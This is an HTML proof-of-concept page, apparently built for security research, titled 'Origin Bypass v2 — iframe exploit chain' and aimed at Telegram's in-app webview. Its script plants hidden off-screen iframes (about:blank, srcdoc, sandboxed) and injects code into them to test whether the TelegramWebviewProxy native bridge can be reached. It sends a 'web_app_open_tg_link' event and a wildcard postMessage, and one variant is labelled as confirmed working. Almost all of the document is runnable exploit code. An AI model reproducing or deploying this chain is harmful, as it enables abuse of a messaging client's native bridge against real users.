<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Origin Bypass v2</title>
<style>
body{background:#0a0a0a;color:#ddd;font:12px monospace;margin:0;padding:10px}
h2{color:#f44;margin:0 0 4px 0}
#log{background:#111;padding:6px;max-height:300px;overflow:auto;white-space:pre-wrap;font:11px monospace}
button{display:block;width:100%;margin:3px 0;padding:8px;background:#222;color:#fff;border:1px solid #444;font:12px monospace;cursor:pointer;text-align:left}
button.fire{background:#4a0000;border-color:#f44;font-size:13px}
.green{color:#0f0}.red{color:#f44}.yellow{color:#ff0}
</style></head><body>
<h2>Origin Bypass v2 — iframe exploit chain</h2>
<div id="log"></div>
<div id="btns"></div>

<script>
const L=(s,c)=>{const e=document.getElementById('log');e.innerHTML+=`<span class="${c||''}">${s}</span>\n`;e.scrollTop=e.scrollHeight;};
L('Origin: '+location.origin,'yellow');
L('Bridge: '+(!!(window.TelegramWebviewProxy?.postEvent) ? 'YES' : 'NO'),'green');

// Helper: create invisible iframe, inject exploit JS
function iframeExploit(src, jsCode) {
  L(`--- iframe: ${src} ---`,'yellow');
  const iframe = document.createElement('iframe');
  iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px';
  iframe.src = src;
  iframe.onload = () => {
    try {
      const win = iframe.contentWindow;
      const doc = win.document;
      doc.open();
      doc.write(`<script>
        var L2 = function(s) { 
          try { document.body.innerHTML += s + '<br>'; } catch(e) {} 
        };
        L2('ORIGIN: ' + location.origin);
        var proxy = window.TelegramWebviewProxy || window.parent?.TelegramWebviewProxy;
        var hasBridge = !!(proxy && proxy.postEvent);
        L2('BRIDGE: ' + (hasBridge ? 'YES!!!' : 'no'));
        if (hasBridge) {
          proxy.postEvent('web_app_open_tg_link', {path_full: '/durov'});
          L2('SENT from iframe!');
        }
        // Also try postMessage to parent
        try {
          window.parent.postMessage(JSON.stringify(['web_app_open_tg_link', {path_full: '/durov'}]), '*');
          L2('postMessage sent');
        } catch(e) { L2('postMessage err: '+e.message); }
      <\\/script>`);
      doc.close();
    } catch(e) {
      L('ERROR: '+e.message,'red');
    }
  };
  document.body.appendChild(iframe);
}

// Exploit 1: about:blank iframe (confirmed working)
function testBlank() {
  L('Test: about:blank iframe','yellow');
  iframeExploit('about:blank');
}

// Exploit 2: srcdoc iframe (no network request!)
function testSrcDoc() {
  L('Test: srcdoc iframe (same origin)','yellow');
  const iframe = document.createElement('iframe');
  iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px';
  iframe.srcdoc = '<script>document.body.innerHTML="srcdoc origin:"+location.origin+" bridge:"+!!(window.TelegramWebviewProxy?.postEvent);<\/script>';
  iframe.onload = () => {
    L('srcdoc origin: '+iframe.contentWindow.location.origin);
    L('srcdoc bridge: '+(!!(iframe.contentWindow.TelegramWebviewProxy?.postEvent)?'YES':'no'));
  };
  document.body.appendChild(iframe);
}

// Exploit 3: sandbox iframe — can we escape?
function testSandbox() {
  L('Test: sandboxed iframe','yellow');
  const iframe = document.createElement('iframe');
  iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px';
  iframe.sandbox = 'allow-scripts';
  iframe.srcdoc = '<script>document.body.innerHTML="SANDBOX origin:"+location.origin+" bridge:"+!!(window.TelegramWebviewProxy?.postEvent);<\/script>';
  iframe.onload = () => {
    try {
      L('sandbox origin: '+iframe.contentWindow.location.origin);
      L('sandbox bridge: '+(!!(iframe.contentWindow.TelegramWebviewProxy?.postEvent)?'YES':'no'));
    } catch(e) {
      L('sandbox access blocked: '+e.message,'red');
    }
  };
  document.body.appendChild(iframe);
}

// Exploit 4: Can we access Telegram WebApp SDK from iframe?
function testSdkFromIframe() {
  L('Test: WebApp SDK from about:blank iframe','yellow');
  const iframe = document.createElement('iframe');
  iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px';
  iframe.src = 'about:blank';
  iframe.onload = () => {
    try {
      const win = iframe.contentWindow;
      const doc = win.document;
      doc.open();
      doc.write(`<script src="https://telegram.org/js/telegram-web-app.js"><\\/script><script>
        var tg = window.Telegram || window.parent.Telegram;
        document.body.innerHTML = "SDK: " + (tg ? "accessible" : "no");
        if (tg && tg.WebApp && tg.WebApp.ready) {
          document.body.innerHTML += " WebApp v" + tg.WebApp.version;
        }
      <\\/script>`);
      doc.close();
      setTimeout(() => {
        L('iframe SDK: '+win.document.body.textContent);
      }, 2000);
    } catch(e) {
      L('ERROR: '+e.message,'red');
    }
  };
  document.body.appendChild(iframe);
}

L('Ready.','green');
document.getElementById('btns').innerHTML = `
  <button class="fire" onclick="testBlank()">about:blank iframe → send cmd (confirmed)</button>
  <button class="fire" onclick="testSrcDoc()">srcdoc iframe → bridge access?</button>
  <button class="fire" onclick="testSandbox()">sandbox iframe → bridge access?</button>
  <button onclick="testSdkFromIframe()">WebApp SDK from iframe?</button>
  <button onclick="location.reload()">RELOAD</button>
`;
</script>
</body>
</html>
